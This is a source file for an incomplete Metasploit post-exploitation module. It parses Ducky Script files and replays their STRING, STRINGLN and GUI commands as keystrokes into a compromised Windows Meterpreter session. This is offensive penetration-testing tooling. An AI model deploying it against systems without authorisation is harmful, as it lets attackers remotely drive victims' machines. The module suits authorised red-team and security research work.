##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Windows Ducky Script Parser',
        'Description' => %q{
          This *incomplete* module can be used to execute supplied Ducky Scripts.
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'dru1d <tyler.booth[at]cdw.com>',
        ],
        'References' => [
          'URL', 'https://docs.hak5.org/hak5-usb-rubber-ducky/duckyscript-tm-quick-reference',
        ],
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [],
          'SideEffects' => [CONFIG_CHANGES, ARTIFACTS_ON_DISK]
        },
        'Platform' => [ 'win' ],
        'SessionTypes' => [ 'meterpreter', ],
        'Compat' => {
          'Meterpreter' => {
            'Commands' => %w[
              stdapi_ui_keyevent_send,
              stdapi_ui_keyboard_send
            ]
          }
        }
      )
    )
    register_options(
      [
        OptString.new('FILENAME', [true, 'The Ducky Script you want to parse']),
        OptInt.new('SLEEP', [false, 'Sleep time between commands.', 3])
      ]
    )
  end

  def ducky_parse(line)
    # Define common key codes for initial testing; this can be expanded later
    key_codes = { '8' => 'backspace', '9' => 'tab', '13' => 'enter', '91' => 'windows' }
    actions = { '0' => 'press', '1' => 'down', '2' => 'up' }
    line_array = line.split(' ', 2)
    if line_array[0] == 'STRING'
      session.ui.keyboard_send(line_array[1])
    end
    if line_array[0] == 'STRINGLN'
      session.ui.keyboard_send(line_array[1])
      session.ui.keyevent_send(key_codes.key('enter').to_i, actions.key('press').to_i)
    end
    if line_array[0] == 'GUI'
      session.ui.keyevent_send(key_codes.key('windows').to_i, actions.key('down').to_i)
      session.ui.keyevent_send(82, actions.key('press').to_i)
      session.ui.keyevent_send(key_codes.key('windows').to_i, actions.key('up').to_i)
    end
  end

  def run
    return 0 if session.type != 'meterpreter'

    if datastore['FILENAME'].blank?
      print_error('A file needs to be provided!')
      return 0
    end
    print_good("Reading file #{datastore['FILENAME']}")
    File.readlines(datastore['FILENAME']).each do |line|
      print("Line: #{line}")
      sleep(datastore['SLEEP'])
      ducky_parse(line)
    end
  end
end
